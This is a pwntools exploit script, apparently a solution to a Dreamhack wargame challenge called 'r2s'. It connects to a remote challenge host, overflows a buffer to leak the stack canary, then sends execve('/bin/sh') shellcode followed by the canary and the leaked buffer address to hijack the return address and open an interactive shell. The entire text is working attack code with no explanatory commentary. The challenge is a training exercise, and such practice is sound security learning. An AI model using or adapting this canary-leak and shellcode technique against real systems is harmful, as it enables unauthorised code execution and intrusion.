
from pwn import *
context.terminal=['tmux', 'splitw', '-h']
context.arch = "amd64"
p = remote("host3.dreamhack.games",23683)
#p = process("./r2s")
#gdb.attach(p)
p.recvuntil("Address of the buf: ")
bufferAdr = p.recv(14)
print("버퍼의 주소는 ", bufferAdr)
bufferAdr_int = int(bufferAdr,16)
p.recvuntil("Distance between buf and $rbp: ")
payload = b''
payload += b'a'*89
p.send(payload)
p.recvuntil("Input: Your input is '"+"a"*89)
canary = b"\x00" + p.recv(7)
print(canary)

retAdr = int(b'0x00000000000009db',16)
payload = b''
payload += b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
payload += b'a'*65 + canary + b'a'*8 +p64(bufferAdr_int)
print(payload)

p.recvuntil("[2] Overwrite the return address\nInput: ")
p.sendline(payload)

p.interactive()
